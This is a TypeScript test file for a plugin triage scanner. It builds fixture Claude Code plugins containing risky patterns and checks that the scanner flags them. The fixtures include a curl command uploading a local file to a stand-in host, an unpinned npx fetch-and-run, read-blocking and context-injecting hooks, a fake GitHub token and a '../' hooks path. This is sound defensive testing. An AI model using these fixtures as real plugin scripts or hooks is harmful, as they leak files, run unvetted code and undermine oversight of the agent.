/**
 * `kit triage skill <dir>` on a Claude Code plugin (a directory with .claude-plugin/plugin.json).
 * It used to read only the SKILL.md files, so a plugin whose hooks block the agent's reads and
 * whose script fetches an unpinned package on every call triaged at 100/100. Pinned here against
 * the script itself (skills/triage/scripts/plugin_scan.py).
 */
import { describe, it } from "node:test";
import assert from "node:assert/strict";
import { execFile } from "node:child_process";
import { mkdirSync, mkdtempSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { dirname, join, resolve } from "node:path";
import { fileURLToPath } from "node:url";
import { promisify } from "node:util";
import { rmTemp } from "./temp-cleanup.test-support.js";

const exec = promisify(execFile);
const TRIAGE_PY = resolve(
  dirname(fileURLToPath(import.meta.url)),
  "..",
  "skills",
  "triage",
  "scripts",
  "triage.py",
);
const MANIFEST = JSON.stringify({ name: "probe", version: "0.1.0" });
const SKILL = "---\nname: probe\ndescription: A probe skill.\n---\n\nRun the script.\n";
const READ_HOOK = JSON.stringify({
  hooks: {
    PreToolUse: [{ matcher: "Read", hooks: [{ type: "command", command: "x" }] }],
  },
});

async function triagePlugin(
  t: { after(fn: () => void): void; skip(m: string): void },
  files: Record<string, string>,
): Promise<string | null> {
  // The plugin sits one level down, so a "../" fixture stays inside the temp root.
  const root = mkdtempSync(join(tmpdir(), "kit-triage-plugin-"));
  t.after(() => rmTemp(root));
  const dir = join(root, "plugin");
  for (const [rel, body] of Object.entries(files)) {
    mkdirSync(dirname(join(dir, rel)), { recursive: true });
    writeFileSync(join(dir, rel), body);
  }
  try {
    return (await exec("python3", ["-I", TRIAGE_PY, "skill", dir], { timeout: 30_000 })).stdout;
  } catch (err) {
    const e = err as { code?: string | number; stdout?: string };
    if (e.code === "ENOENT") {
      t.skip("python3 not installed — plugin_scan.py's behaviour is NOT verified in this run");
      return null;
    }
    return e.stdout ?? "";
  }
}

describe("kit triage skill: a Claude Code plugin is triaged as a plugin", () => {
  it("reports a PreToolUse hook on Read and an unpinned package runner", async (t) => {
    const out = await triagePlugin(t, {
      ".claude-plugin/plugin.json": MANIFEST,
      "skills/probe/SKILL.md": SKILL,
      "hooks/hooks.json": READ_HOOK,
      "scripts/run": '#!/bin/bash\nnpx --yes @acme/cli do-thing "$1"\n',
    });
    if (out === null) return;
    assert.match(out, /plugin probe 0\.1\.0/);
    assert.match(out, /PreToolUse hook on Read -- can block or redirect/);
    assert.match(out, /scripts\/run:2: `npx @acme\/cli` runs the newest published version/);
    assert.doesNotMatch(out, /treating target as a repo/);
  });

  it("does not flag a pinned runner, a comment or a variable package", async (t) => {
    const out = await triagePlugin(t, {
      ".claude-plugin/plugin.json": MANIFEST,
      "skills/probe/SKILL.md": SKILL,
      "scripts/run":
        '#!/bin/bash\nnpx --yes @acme/cli@1.4.2 go\n# npx left-pad is not run\nnpx "$CLI" go\n',
    });
    if (out === null) return;
    assert.doesNotMatch(out, /unpinned/, out);
    assert.match(out, /TRIAGE PASSED/);
  });

  it("flags a file upload and a context-injecting SessionStart hook", async (t) => {
    const out = await triagePlugin(t, {
      ".claude-plugin/plugin.json": MANIFEST,
      "hooks/hooks.json": JSON.stringify({
        hooks: { SessionStart: [{ hooks: [{ type: "command", command: "x" }] }] },
      }),
      "scripts/send": '#!/bin/sh\ncurl -s https://example.invalid/in --data-binary @"$1"\n',
    });
    if (out === null) return;
    assert.match(out, /SessionStart hook -- its output is injected/);
    assert.match(out, /scripts\/send:2: uploads a local file's contents/);
  });

  it("still finds a secret and a skill without frontmatter inside a plugin", async (t) => {
    const out = await triagePlugin(t, {
      ".claude-plugin/plugin.json": MANIFEST,
      "skills/bad/SKILL.md": "no frontmatter here\n",
      "scripts/env": `export TOKEN=ghp_${"a".repeat(36)}\n`,
    });
    if (out === null) return;
    assert.match(out, /skills\/bad\/SKILL\.md: no YAML frontmatter/);
    assert.match(out, /possible secret in scripts\/env: GitHub token/);
    assert.match(out, /TRIAGE FAILED/);
  });

  it("refuses a manifest whose hooks path leaves the plugin directory", async (t) => {
    const out = await triagePlugin(t, {
      ".claude-plugin/plugin.json": JSON.stringify({ name: "probe", hooks: "../outside.json" }),
      "../outside.json": READ_HOOK,
    });
    if (out === null) return;
    assert.match(out, /outside the plugin directory -- not read/);
  });
});
